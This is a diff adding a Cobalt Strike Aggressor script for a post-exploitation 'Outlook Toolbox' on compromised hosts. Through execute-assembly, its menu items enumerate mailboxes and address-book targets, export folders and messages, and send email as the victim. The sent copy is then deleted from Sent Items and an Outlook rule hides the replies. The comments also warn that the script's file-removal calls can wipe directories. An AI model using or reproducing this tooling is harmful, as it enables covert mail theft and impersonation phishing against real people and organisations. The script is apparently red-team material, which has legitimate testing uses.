@@ -1,0 +1,156 @@
+###
+#This Cobalt Strike Aggressor script will run OutlookToolbox.dll with rundll32
+#I've tested various invalid inputs to see if I could create a user popup or have an unexpected effect
+#However, you should not fully trust this tool,  test in your lab.
+#Be careful of brm function, this script calls it several times.  If the filename isn't specified or there is a mistake in the script an entire directory could be deleted
+#Do NOT set $targetDir = C:\ ... brm could screw up the system
+#I wasn't able to get the wait function to work so I tried to wait for downloads by using on beacon_output_alt, the results are okay.  It appears that it works but the output
+#will not flush and will display multiple times.
+###
+###
+#The directory OutlookToolbox will work out of
+###
+global('$targetDir');
+$targetDir = "C:\\Users\\Public\\Documents";
+
+###
+#DLL Name.  Feel free to change this but if it's set to "" brm will deleted folders.
+#Also, if the $dllName variable name is changed the script could remove directories ... just be careful 
+###
+
+
+#Menu Setup
+popup beacon_bottom {
+	menu "Outlook Toolbox" {
+		
+		###
+		#Use OutlookToolbox's popup checker
+		###
+
+		item "&Sanity Check"
+		{			
+			bexecute_assembly($1, script_resource("OutlookToolbox.exe"), "SanityCheck");
+		}
+
+		###
+		#Get root Outlook folders (inbox, sent items, deleted items, conversation history (juicy))
+		###
+
+		item "&Get Outlook Root Folders"
+		{
+		 	bexecute_assembly($1, script_resource("OutlookToolbox.exe"), "EnumerateFolders");
+		}
+
+		###
+		#Sends an email on behalf of the target user
+		#The message should be removed from the sent items removing any trace
+		#Using the mute option will create an outlook rule that sends replies from target recipients to the deleted items folder		
+		###
+
+		item "&Email Pivot"
+		{	
+			local('$bid $epDisplay %fileSelect');			
+			foreach $bid ($1) {
+				$epDisplay = dialog("Email Pivot", %(bid => $bid, file => $file), {
+					local('$fileP @filePath $dirP @dirPath $fullPath');				
+					%fileSelect = $3;
+					if((%fileSelect["file"] hasmatch ' ') || (%fileSelect["file"] eq $null)) { blog(%fileSelect["bid"], "Message filename cannot be null or have any spaces in it"); }
+					@filePath = split('/',%fileSelect["file"]);
+					foreach $fileP (@filePath)
+					{
+						if($fileP ismatch '.*\.msg') { $messageName = replace($fileP," ", ""); }
+					}
+					bupload(%fileSelect["bid"], %fileSelect["file"]);
+					
+					#Reference - Raffi's Gist - https://gist.github.com/rsmudge/bfe022245fb0f5491950b0e58cc80e0b
+					bpwd(%fileSelect["bid"]);
+					when("beacon_output_alt", $this);
+					yield;					
+
+					@dirPath = split(' ',$2);
+					$dirP = @dirPath[3];
+					$fullPath = "$dirP\\$fileP";
+					if(%fileSelect["mute"] ismatch "true") { bexecute_assembly(%fileSelect["bid"], script_resource("OutlookToolbox.exe"), "EmailPivot $fullPath mute"); }				
+					else if(%fileSelect["mute"] ismatch "false") { bexecute_assembly(%fileSelect["bid"], script_resource("OutlookToolbox.exe"), "EmailPivot $fullPath"); }					
+				});						
+				dialog_description($epDisplay, "This will upload and send a .msg file from the user's Outlook session. **WARNING** This will automatically upload the target .msg file to your current working directory! Also, it will not delete the .msg file, clean up is up to you");
+				drow_file($epDisplay, "file", "Select Email Message (.msg)");
+				drow_checkbox($epDisplay, "mute", "Mute Response", "Mute replies from target recipients using Outlook rules");
+				dbutton_action($epDisplay, "Run");
+				dialog_show($epDisplay);				
+			}			
+		}
+
+		###
+		#Enumerates target user that could be used to craft an email with emailpivot
+		#Will attempt to resolve either name, username, or email address against the GAL
+		#Will return full name, username, email address, job title, city, manager's name, and users that report to the same manager
+		###
+
+		item "Enumerate &Target"
+		{ 
+			local('$bid %targetSelect $etDisplay');
+			foreach $bid ($1) {
+				$etDisplay = dialog("Enumerate Target", %(bid => $bid), {
+					%targetSelect = $3;
+					$targetName = %targetSelect["targetName"];
+					bexecute_assembly(%targetSelect["bid"], script_resource("OutlookToolbox.exe"), "EnumerateTarget \"$targetName\"");
+					
+				});				
+			}
+
+			dialog_description($etDisplay, "This will enumerate target user");
+			drow_text($etDisplay, "targetName", "Target Username or Full Name:");	
+			dbutton_action($etDisplay, "Run");
+			dialog_show($etDisplay);						
+		}
+
+		###
+		#Exports target outlook folder to CSV file (inbox, sent items, conversation messages, etc)
+		###
+
+		item "Export Folder to &CSV"
+		{ 
+			local('$bid %folderSelect $ecDisplay $targetFolder');
+			foreach $bid ($1) {
+				$ecDisplay = dialog("Export Folder to CSV", %(bid => $bid), {
+					%folderSelect = $3;
+					$targetFolder = %folderSelect["targetFolder"];				
+					bexecute_assembly(%folderSelect["bid"], script_resource("OutlookToolbox.exe"), "FolderToCSV \"$targetFolder\"");
+					yield;
+				});						
+				dialog_description($ecDisplay, "This will export target folder to CSV to %APPDATA%. You will get a notification when the export is complete, it can take a while.");
+				drow_text($ecDisplay, "targetFolder", "Target Outlook Folder:");	
+				dbutton_action($ecDisplay, "Run");
+				dialog_show($ecDisplay);				
+			}			
+		}
+
+		###
+		#Exports target message to .msg file.
+		###
+
+		item "Export &Message"
+		{ 
+			local('$bid %messageSelect $dmDisplay $targetToFolder $sCriteria $searchFor');
+			foreach $bid ($1) {
+				$dmDisplay = dialog("Export Message", %(bid => $bid), {
+					%messageSelect = $3;
+					$targetToFolder = %messageSelect["targetToFolder"];
+					$sCriteria = %messageSelect["sCriteria"];
+					$searchFor = %messageSelect["searchFor"];
+					bexecute_assembly(%messageSelect["bid"], script_resource("OutlookToolbox.exe"), "ExportMessage $targetToFolder $sCriteria $searchFor");
+					yield;
+				});
+					
+				dialog_description($dmDisplay, "This will export email(s) from the target.  Search criteria can filter on the sender's email address (senderemail) or index number (index); the email index can be found in the Folder to CSV module.  If using senderemail, it will zip up all the emails.");
+				drow_text($dmDisplay, "targetToFolder", "Target Outlook Folder:");					
+				drow_combobox($dmDisplay, "sCriteria", "Search Criteria", @("senderemail", "index"));
+				drow_text($dmDisplay, "searchFor", "Search For:");								
+				dbutton_action($dmDisplay, "Export");
+				dialog_show($dmDisplay);				
+			}
+			
+		}
+	}
+}		
